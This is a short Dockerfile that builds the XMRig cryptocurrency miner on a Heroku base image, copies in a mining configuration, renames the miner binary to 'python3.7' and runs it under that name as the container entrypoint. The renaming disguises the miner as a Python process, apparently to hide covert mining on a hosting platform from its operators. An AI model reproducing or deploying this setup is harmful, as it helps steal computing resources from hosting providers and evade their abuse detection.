FROM heroku/heroku:20-build

RUN sudo apt-get update
RUN sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
RUN sudo apt-get install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev libjansson-dev libgmp-dev make g++ git

RUN git clone https://github.com/xmrig/xmrig

RUN mkdir xmrig/build && cd xmrig/build && \
    cmake .. && \
    make -j$(nproc) && \
    chmod +x xmrig && \
    rm -r /xmrig/src

COPY config.json /xmrig/build/config.json
WORKDIR /xmrig/build
RUN mv xmrig python3.7

ENTRYPOINT ["./python3.7"]
